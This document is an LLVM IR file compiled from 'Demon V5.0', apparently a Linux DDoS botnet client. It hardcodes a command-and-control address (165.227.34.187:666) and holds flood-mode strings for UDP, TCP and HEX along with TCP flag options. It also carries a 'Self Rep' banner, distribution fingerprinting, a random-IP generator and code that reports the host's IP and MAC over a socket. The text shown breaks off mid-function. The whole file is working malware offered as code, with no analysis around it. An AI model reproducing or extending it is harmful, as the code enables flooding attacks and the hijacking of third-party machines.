; ModuleID = 'host/ir_O1/Demon.e.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.ifreq = type { %union.anon, %union.anon.0 }
%union.anon = type { [16 x i8] }
%union.anon.0 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.1 }
%union.anon.1 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }

@Demonserv = local_unnamed_addr global [1 x i8*] [i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [19 x i8] c"165.227.34.187:666\00", align 1
@Demonicsock = local_unnamed_addr global i32 0, align 4
@currentServer = local_unnamed_addr global i32 -1, align 4
@gotIP = local_unnamed_addr global i32 0, align 4
@numpids = local_unnamed_addr global i64 0, align 8
@macAddress = local_unnamed_addr global [6 x i8] zeroinitializer, align 1
@ourIP = common local_unnamed_addr global %struct.in_addr zeroinitializer, align 4
@pids = common local_unnamed_addr global i32* null, align 8
@Q = internal unnamed_addr global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal unnamed_addr global i32 4095, align 4
@c = internal unnamed_addr global i32 362436, align 4
@.str.1 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.2 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.3 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.36 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.4 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.5 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.6 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.7 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.8 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.9 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.10 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@astd.hexstring = private unnamed_addr constant [1 x i8*] [i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.11, i32 0, i32 0)], align 8
@.str.11 = private unnamed_addr constant [78 x i8] c"Self Rep Fucking NeTiS and Thisity 0n Ur FuCkInG FoReHeAd We BiG L33T HaxErS\0A\00", align 1
@.str.12 = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.13 = private unnamed_addr constant [6 x i8] c"Linux\00", align 1
@.str.14 = private unnamed_addr constant [17 x i8] c"/usr/bin/apt-get\00", align 1
@.str.15 = private unnamed_addr constant [7 x i8] c"Ubuntu\00", align 1
@.str.16 = private unnamed_addr constant [17 x i8] c"/usr/lib/portage\00", align 1
@.str.17 = private unnamed_addr constant [7 x i8] c"Gentoo\00", align 1
@.str.18 = private unnamed_addr constant [13 x i8] c"/usr/bin/yum\00", align 1
@.str.19 = private unnamed_addr constant [7 x i8] c"CentOS\00", align 1
@.str.20 = private unnamed_addr constant [17 x i8] c"/usr/share/YaST2\00", align 1
@.str.21 = private unnamed_addr constant [9 x i8] c"OpenSUSE\00", align 1
@.str.22 = private unnamed_addr constant [19 x i8] c"/usr/local/etc/pkg\00", align 1
@.str.23 = private unnamed_addr constant [8 x i8] c"FreeBSD\00", align 1
@.str.24 = private unnamed_addr constant [15 x i8] c"/etc/dropbear/\00", align 1
@.str.25 = private unnamed_addr constant [9 x i8] c"Dropbear\00", align 1
@.str.26 = private unnamed_addr constant [10 x i8] c"/etc/opkg\00", align 1
@.str.27 = private unnamed_addr constant [8 x i8] c"OpenWRT\00", align 1
@.str.28 = private unnamed_addr constant [15 x i8] c"Unknown Distro\00", align 1
@.str.29 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.30 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.31 = private unnamed_addr constant [4 x i8] c"HEX\00", align 1
@.str.32 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.33 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.34 = private unnamed_addr constant [180 x i8] c"\1B[1;31mDemon\1B[1;37m[\1B[1;31mV5.0\1B[1;37m]\1B[1;31m-->\1B[1;37m[\1B[0;36m%s\1B[1;37m]\1B[1;31m-->\1B[1;37m[\1B[0;36m%s\1B[1;37m]\1B[1;31m-->\1B[1;37m[\1B[0;36m%s\1B[1;37m]\1B[1;31m-->\1B[1;37m[\1B[0;36m%s\1B[1;37m]\00", align 1
@.str.35 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline norecurse nounwind uwtable
define void @init_rand(i32) local_unnamed_addr #0 {
  store i32 %0, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %2 = add i32 %0, -1640531527
  store i32 %2, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %3 = add i32 %0, 1013904242
  store i32 %3, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  br label %4

; <label>:4:                                      ; preds = %17, %1
  %indvars.iv = phi i64 [ 3, %1 ], [ %indvars.iv.next.1, %17 ]
  %5 = add nsw i64 %indvars.iv, -3
  %6 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %5
  %7 = load i32, i32* %6, align 4
  %8 = add nsw i64 %indvars.iv, -2
  %9 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %8
  %10 = load i32, i32* %9, align 4
  %11 = trunc i64 %indvars.iv to i32
  %12 = xor i32 %11, -1640531527
  %13 = xor i32 %12, %7
  %14 = xor i32 %13, %10
  %15 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %indvars.iv
  store i32 %14, i32* %15, align 4
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, 4096
  br i1 %exitcond, label %16, label %17

; <label>:16:                                     ; preds = %4
  ret void

; <label>:17:                                     ; preds = %4
  %18 = add nsw i64 %indvars.iv, -2
  %19 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %18
  %20 = load i32, i32* %19, align 4
  %21 = add nsw i64 %indvars.iv, -1
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = trunc i64 %indvars.iv.next to i32
  %25 = xor i32 %24, -1640531527
  %26 = xor i32 %25, %20
  %27 = xor i32 %26, %23
  %28 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %indvars.iv.next
  store i32 %27, i32* %28, align 4
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  br label %4
}

; Function Attrs: noinline norecurse nounwind uwtable
define i32 @rand_cmwc() local_unnamed_addr #0 {
  %1 = load i32, i32* @rand_cmwc.i, align 4
  %2 = add i32 %1, 1
  %3 = and i32 %2, 4095
  store i32 %3, i32* @rand_cmwc.i, align 4
  %4 = zext i32 %3 to i64
  %5 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %4
  %6 = load i32, i32* %5, align 4
  %7 = zext i32 %6 to i64
  %8 = mul nuw nsw i64 %7, 18782
  %9 = load i32, i32* @c, align 4
  %10 = zext i32 %9 to i64
  %11 = add nuw nsw i64 %8, %10
  %12 = lshr i64 %11, 32
  %13 = trunc i64 %12 to i32
  %14 = add nuw nsw i64 %12, %11
  %15 = trunc i64 %14 to i32
  %16 = icmp ult i32 %15, %13
  %17 = zext i1 %16 to i32
  %storemerge = add nuw nsw i32 %17, %13
  store i32 %storemerge, i32* @c, align 4
  %.neg7 = sext i1 %16 to i32
  %.0.neg = sub i32 -2, %15
  %18 = add i32 %.0.neg, %.neg7
  %19 = load i32, i32* @rand_cmwc.i, align 4
  %20 = zext i32 %19 to i64
  %21 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %20
  store i32 %18, i32* %21, align 4
  ret i32 %18
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) local_unnamed_addr #1 {
  %2 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %3 = tail call i32 @ntohl(i32 %2) #14
  %4 = and i32 %3, %0
  %5 = tail call i32 @rand_cmwc()
  %6 = xor i32 %0, -1
  %7 = and i32 %5, %6
  %8 = xor i32 %7, %4
  ret i32 %8
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) local_unnamed_addr #1 {
  %4 = icmp sgt i32 %1, 0
  br i1 %4, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %3
  %5 = sext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %10
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %10 ]
  %6 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %7 = getelementptr inbounds i8, i8* %6, i64 -1
  %8 = load i8, i8* %7, align 1
  %9 = icmp eq i8 %8, 10
  br i1 %9, label %.critedge.loopexit, label %10

; <label>:10:                                     ; preds = %.lr.ph
  %11 = tail call i64 @read(i32 %2, i8* %6, i64 1) #7
  %12 = trunc i64 %11 to i32
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %13 = icmp eq i32 %12, 1
  %14 = icmp slt i64 %indvars.iv.next, %5
  %or.cond = and i1 %13, %14
  br i1 %or.cond, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph, %10
  %.011.lcssa.ph = phi i32 [ 1, %.lr.ph ], [ %12, %10 ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %3
  %.011.lcssa = phi i32 [ 1, %3 ], [ %.011.lcssa.ph, %.critedge.loopexit ]
  %15 = icmp eq i32 %.011.lcssa, 0
  %16 = select i1 %15, i8* null, i8* %0
  ret i8* %16
}

declare i64 @read(i32, i8* nocapture, i64) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() local_unnamed_addr #1 {
  %1 = alloca %struct.sockaddr_in, align 4
  %2 = alloca %struct.sockaddr_in, align 4
  %3 = alloca i32, align 4
  %4 = alloca [4096 x i8], align 16
  %5 = alloca %struct.ifreq, align 8
  %6 = tail call i32 @socket(i32 2, i32 2, i32 0) #7
  %7 = icmp eq i32 %6, -1
  br i1 %7, label %46, label %8

; <label>:8:                                      ; preds = %0
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 3, i64 0
  %10 = bitcast i8* %9 to i64*
  store i64 0, i64* %10, align 4
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = tail call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0)) #7
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 2, i32 0
  store i32 %12, i32* %13, align 4
  %14 = tail call zeroext i16 @htons(i16 zeroext 53) #14
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 1
  store i16 %14, i16* %15, align 2
  %16 = bitcast %struct.sockaddr_in* %1 to %struct.sockaddr*
  %17 = call i32 @connect(i32 %6, %struct.sockaddr* nonnull %16, i32 16) #7
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %46, label %19

; <label>:19:                                     ; preds = %8
  store i32 16, i32* %3, align 4
  %20 = bitcast %struct.sockaddr_in* %2 to %struct.sockaddr*
  %21 = call i32 @getsockname(i32 %6, %struct.sockaddr* nonnull %20, i32* nonnull %3) #7
  %22 = icmp eq i32 %21, -1
  br i1 %22, label %46, label %23

; <label>:23:                                     ; preds = %19
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 2, i32 0
  %25 = load i32, i32* %24, align 4
  store i32 %25, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %26 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.2, i64 0, i64 0), i32 0) #7
  %27 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 0
  %28 = call i8* @fdgets(i8* nonnull %27, i32 4096, i32 %26)
  %29 = icmp eq i8* %28, null
  br i1 %29, label %.loopexit17, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %23
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %36
  %30 = call i8* @strstr(i8* nonnull %27, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i64 0, i64 0)) #15
  %31 = icmp eq i8* %30, null
  br i1 %31, label %36, label %.preheader.preheader

.preheader.preheader:                             ; preds = %.lr.ph
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.015 = phi i8* [ %34, %.preheader ], [ %27, %.preheader.preheader ]
  %32 = load i8, i8* %.015, align 1
  %33 = icmp eq i8 %32, 9
  %34 = getelementptr inbounds i8, i8* %.015, i64 1
  br i1 %33, label %35, label %.preheader

; <label>:35:                                     ; preds = %.preheader
  store i8 0, i8* %.015, align 1
  br label %.loopexit17

; <label>:36:                                     ; preds = %.lr.ph
  call void @llvm.memset.p0i8.i64(i8* nonnull %27, i8 0, i64 4096, i32 16, i1 false)
  %37 = call i8* @fdgets(i8* nonnull %27, i32 4096, i32 %26)
  %38 = icmp eq i8* %37, null
  br i1 %38, label %.loopexit17.loopexit, label %.lr.ph

.loopexit17.loopexit:                             ; preds = %36
  br label %.loopexit17

.loopexit17:                                      ; preds = %.loopexit17.loopexit, %23, %35
  %39 = call i32 @close(i32 %26) #7
  %40 = load i8, i8* %27, align 16
  %41 = icmp eq i8 %40, 0
  br i1 %41, label %.loopexit, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %.loopexit17
  %42 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %5, i64 0, i32 0, i32 0, i64 0
  %43 = call i8* @strcpy(i8* nonnull %42, i8* nonnull %27) #7
  %44 = call i32 (i32, i64, ...) @ioctl(i32 %6, i64 35111, %struct.ifreq* nonnull %5) #7
  %scevgep = getelementptr inbounds %struct.ifreq, %struct.ifreq* %5, i64 0, i32 1, i32 0, i32 0
  %scevgep20 = bitcast i64* %scevgep to i8*
  %uglygep = getelementptr inbounds i8, i8* %scevgep20, i64 2
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 0), i8* %uglygep, i64 6, i32 1, i1 false)
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.loopexit17
  %45 = call i32 @close(i32 %6) #7
  br label %46

; <label>:46:                                     ; preds = %19, %8, %0, %.loopexit
  ret i32 0
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) local_unnamed_addr #4

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #2

declare i32 @connect(i32, %struct.sockaddr*, i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) local_unnamed_addr #4

declare i32 @open(i8* nocapture readonly, i32, ...) local_unnamed_addr #3

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8* nocapture) local_unnamed_addr #6

declare i32 @close(i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8* nocapture readonly) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define void @trim(i8* nocapture) local_unnamed_addr #1 {
  %2 = tail call i64 @strlen(i8* %0) #15
  %3 = add i64 %2, 4294967295
  br label %4

; <label>:4:                                      ; preds = %4, %1
  %indvars.iv29 = phi i64 [ %indvars.iv.next30, %4 ], [ 0, %1 ]
  %5 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv29
  %6 = load i8, i8* %5, align 1
  %7 = sext i8 %6 to i32
  %8 = tail call i32 @isspace(i32 %7) #15
  %9 = icmp eq i32 %8, 0
  %indvars.iv.next30 = add nuw i64 %indvars.iv29, 1
  br i1 %9, label %.preheader, label %4

.preheader:                                       ; preds = %4
  %10 = trunc i64 %3 to i32
  %11 = trunc i64 %indvars.iv29 to i32
  %12 = icmp slt i32 %10, %11
  br i1 %12, label %.critedge.preheader, label %.lr.ph22.preheader

.lr.ph22.preheader:                               ; preds = %.preheader
  %sext = shl i64 %3, 32
  %13 = ashr exact i64 %sext, 32
  %sext31 = shl i64 %indvars.iv29, 32
  %14 = ashr exact i64 %sext31, 32
  br label %.lr.ph22

.critedge.preheader.loopexit:                     ; preds = %.lr.ph22, %25
  %.0.lcssa.ph = phi i32 [ %24, %.lr.ph22 ], [ %26, %25 ]
  br label %.critedge.preheader

.critedge.preheader:                              ; preds = %.critedge.preheader.loopexit, %.preheader
  %.0.lcssa = phi i32 [ %10, %.preheader ], [ %.0.lcssa.ph, %.critedge.preheader.loopexit ]
  %15 = icmp sgt i32 %11, %.0.lcssa
  br i1 %15, label %.critedge._crit_edge, label %.critedge.preheader26

.critedge.preheader26:                            ; preds = %.critedge.preheader
  %sext32 = shl i64 %indvars.iv29, 32
  %16 = ashr exact i64 %sext32, 32
  %sext33 = shl i64 %indvars.iv29, 32
  %17 = ashr exact i64 %sext33, 32
  %18 = sext i32 %.0.lcssa to i64
  br label %.critedge

.lr.ph22:                                         ; preds = %.lr.ph22.preheader, %25
  %indvars.iv27 = phi i64 [ %13, %.lr.ph22.preheader ], [ %indvars.iv.next28, %25 ]
  %.021 = phi i32 [ %10, %.lr.ph22.preheader ], [ %26, %25 ]
  %19 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv27
  %20 = load i8, i8* %19, align 1
  %21 = sext i8 %20 to i32
  %22 = tail call i32 @isspace(i32 %21) #15
  %23 = icmp eq i32 %22, 0
  %24 = trunc i64 %indvars.iv27 to i32
  br i1 %23, label %.critedge.preheader.loopexit, label %25

; <label>:25:                                     ; preds = %.lr.ph22
  %indvars.iv.next28 = add nsw i64 %indvars.iv27, -1
  %26 = add nsw i32 %.021, -1
  %27 = icmp sgt i64 %indvars.iv27, %14
  br i1 %27, label %.lr.ph22, label %.critedge.preheader.loopexit

.critedge:                                        ; preds = %.critedge.preheader26, %.critedge
  %indvars.iv = phi i64 [ %16, %.critedge.preheader26 ], [ %indvars.iv.next, %.critedge ]
  %28 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %29 = load i8, i8* %28, align 1
  %30 = sub nsw i64 %indvars.iv, %17
  %31 = getelementptr inbounds i8, i8* %0, i64 %30
  store i8 %29, i8* %31, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %32 = icmp slt i64 %indvars.iv, %18
  br i1 %32, label %.critedge, label %.critedge._crit_edge.loopexit

.critedge._crit_edge.loopexit:                    ; preds = %.critedge
  br label %.critedge._crit_edge

.critedge._crit_edge:                             ; preds = %.critedge._crit_edge.loopexit, %.critedge.preheader
  %.019.lcssa = phi i64 [ %indvars.iv29, %.critedge.preheader ], [ %indvars.iv.next, %.critedge._crit_edge.loopexit ]
  %33 = sub i64 %.019.lcssa, %indvars.iv29
  %sext34 = shl i64 %33, 32
  %34 = ashr exact i64 %sext34, 32
  %35 = getelementptr inbounds i8, i8* %0, i64 %34
  store i8 0, i8* %35, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8* nocapture) local_unnamed_addr #6

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) local_unnamed_addr #6

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %3 = alloca i8*, align 8
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  %5 = tail call noalias i8* @malloc(i64 2048) #7
  store i8* %5, i8** %3, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 2048, i32 1, i1 false)
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %7 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %7)
  call fastcc void @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %6)
  call void @llvm.va_end(i8* nonnull %7)
  %8 = call i64 @strlen(i8* %5) #15
  %9 = getelementptr inbounds i8, i8* %5, i64 %8
  store i8 10, i8* %9, align 1
  %10 = call i64 @strlen(i8* %5) #15
  %11 = call i64 @send(i32 %0, i8* %5, i64 %10, i32 16384) #7
  %12 = trunc i64 %11 to i32
  call void @free(i8* %5) #7
  ret i32 %12
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #7

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @print(i8**, i8* nocapture readonly, %struct.__va_list_tag*) unnamed_addr #1 {
  %4 = alloca [2 x i8], align 1
  %5 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %6 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %7 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %8 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %9 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %10 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %11 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %12 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %13 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %14 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %15 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %16 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %17 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %18 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %19 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %20 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %21 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %22 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 0
  %23 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 1
  %24 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  br label %25

; <label>:25:                                     ; preds = %146, %3
  %.0 = phi i8* [ %1, %3 ], [ %147, %146 ]
  %26 = load i8, i8* %.0, align 1
  switch i8 %26, label %143 [
    i8 0, label %148
    i8 37, label %27
  ]

; <label>:27:                                     ; preds = %25
  %28 = getelementptr inbounds i8, i8* %.0, i64 1
  %29 = load i8, i8* %28, align 1
  switch i8 %29, label %.preheader6 [
    i8 0, label %148
    i8 37, label %143
    i8 45, label %30
  ]

; <label>:30:                                     ; preds = %27
  %31 = getelementptr inbounds i8, i8* %.0, i64 2
  br label %.preheader6

.preheader6:                                      ; preds = %30, %27
  %.063.ph = phi i32 [ 0, %27 ], [ 1, %30 ]
  %.1.ph = phi i8* [ %28, %27 ], [ %31, %30 ]
  %32 = load i8, i8* %.1.ph, align 1
  %33 = icmp eq i8 %32, 48
  br i1 %33, label %.lr.ph.preheader, label %.preheader

.lr.ph.preheader:                                 ; preds = %.preheader6
  br label %.lr.ph

.preheader.loopexit:                              ; preds = %.lr.ph
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader6
  %.063.lcssa = phi i32 [ %.063.ph, %.preheader6 ], [ %37, %.preheader.loopexit ]
  %.1.lcssa = phi i8* [ %.1.ph, %.preheader6 ], [ %36, %.preheader.loopexit ]
  %34 = load i8, i8* %.1.lcssa, align 1
  %.off10 = add i8 %34, -48
  %35 = icmp ult i8 %.off10, 10
  br i1 %35, label %.lr.ph13.preheader, label %.critedge

.lr.ph13.preheader:                               ; preds = %.preheader
  br label %.lr.ph13

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.18 = phi i8* [ %36, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %.0637 = phi i32 [ %37, %.lr.ph ], [ %.063.ph, %.lr.ph.preheader ]
  %36 = getelementptr inbounds i8, i8* %.18, i64 1
  %37 = or i32 %.0637, 2
  %38 = load i8, i8* %36, align 1
  %39 = icmp eq i8 %38, 48
  br i1 %39, label %.lr.ph, label %.preheader.loopexit

.lr.ph13:                                         ; preds = %.lr.ph13.preheader, %.lr.ph13
  %40 = phi i8 [ %46, %.lr.ph13 ], [ %34, %.lr.ph13.preheader ]
  %.212 = phi i8* [ %45, %.lr.ph13 ], [ %.1.lcssa, %.lr.ph13.preheader ]
  %.06411 = phi i32 [ %44, %.lr.ph13 ], [ 0, %.lr.ph13.preheader ]
  %41 = zext i8 %40 to i32
  %42 = mul nsw i32 %.06411, 10
  %43 = add i32 %42, -48
  %44 = add i32 %43, %41
  %45 = getelementptr inbounds i8, i8* %.212, i64 1
  %46 = load i8, i8* %45, align 1
  %.off = add i8 %46, -48
  %47 = icmp ult i8 %.off, 10
  br i1 %47, label %.lr.ph13, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph13
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %.preheader
  %.064.lcssa = phi i32 [ 0, %.preheader ], [ %44, %.critedge.loopexit ]
  %.2.lcssa = phi i8* [ %.1.lcssa, %.preheader ], [ %45, %.critedge.loopexit ]
  %.lcssa = phi i8 [ %34, %.preheader ], [ %46, %.critedge.loopexit ]
  switch i8 %.lcssa, label %146 [
    i8 115, label %48
    i8 100, label %67
    i8 120, label %82
    i8 88, label %97
    i8 117, label %112
    i8 99, label %127
  ]

; <label>:48:                                     ; preds = %.critedge
  %49 = load i32, i32* %5, align 8
  %50 = icmp ult i32 %49, 41
  br i1 %50, label %51, label %56

; <label>:51:                                     ; preds = %48
  %52 = load i8*, i8** %6, align 8
  %53 = sext i32 %49 to i64
  %54 = getelementptr i8, i8* %52, i64 %53
  %55 = add i32 %49, 8
  store i32 %55, i32* %5, align 8
  br label %59

; <label>:56:                                     ; preds = %48
  %57 = load i8*, i8** %7, align 8
  %58 = getelementptr i8, i8* %57, i64 8
  store i8* %58, i8** %7, align 8
  br label %59

; <label>:59:                                     ; preds = %56, %51
  %.in5 = phi i8* [ %54, %51 ], [ %57, %56 ]
  %60 = bitcast i8* %.in5 to i32*
  %61 = load i32, i32* %60, align 4
  %62 = sext i32 %61 to i64
  %63 = inttoptr i64 %62 to i8*
  %64 = icmp ne i32 %61, 0
  %65 = select i1 %64, i8* %63, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.36, i64 0, i64 0)
  %66 = tail call fastcc i32 @prints(i8** %0, i8* %65, i32 %.064.lcssa, i32 %.063.lcssa)
  br label %146

; <label>:67:                                     ; preds = %.critedge
  %68 = load i32, i32* %8, align 8
  %69 = icmp ult i32 %68, 41
  br i1 %69, label %70, label %75

; <label>:70:                                     ; preds = %67
  %71 = load i8*, i8** %9, align 8
  %72 = sext i32 %68 to i64
  %73 = getelementptr i8, i8* %71, i64 %72
  %74 = add i32 %68, 8
  store i32 %74, i32* %8, align 8
  br label %78

; <label>:75:                                     ; preds = %67
  %76 = load i8*, i8** %10, align 8
  %77 = getelementptr i8, i8* %76, i64 8
  store i8* %77, i8** %10, align 8
  br label %78

; <label>:78:                                     ; preds = %75, %70
  %.in4 = phi i8* [ %73, %70 ], [ %76, %75 ]
  %79 = bitcast i8* %.in4 to i32*
  %80 = load i32, i32* %79, align 4
  %81 = tail call fastcc i32 @printi(i8** %0, i32 %80, i32 10, i32 1, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  br label %146

; <label>:82:                                     ; preds = %.critedge
  %83 = load i32, i32* %11, align 8
  %84 = icmp ult i32 %83, 41
  br i1 %84, label %85, label %90

; <label>:85:                                     ; preds = %82
  %86 = load i8*, i8** %12, align 8
  %87 = sext i32 %83 to i64
